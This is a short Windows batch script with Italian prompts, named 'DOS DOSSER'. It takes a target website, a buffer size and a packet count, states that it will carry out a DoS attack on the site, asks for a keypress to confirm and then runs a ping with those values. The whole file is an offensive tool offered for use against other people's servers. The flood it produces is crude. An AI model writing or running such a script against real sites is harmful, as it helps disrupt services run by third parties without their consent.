@echo off
color 0a
cls
REM Immettere il comando ddssr website dimensione_buffer numero_pacchetti per eseguire un attacco
echo.
echo ~~DOS DOSSER~~
echo.
set website=%1
set size=%2
set num=%3
echo Stai per mettere in atto un attacco DoS di buffer %size% per %num% volte al sito %website%
echo.
echo Premere un tasto per confermare ed attaccare
pause>nul
ping %website% -n %num% -l %size%
echo.
echo Premere un tasto per uscire
pause>nul
exit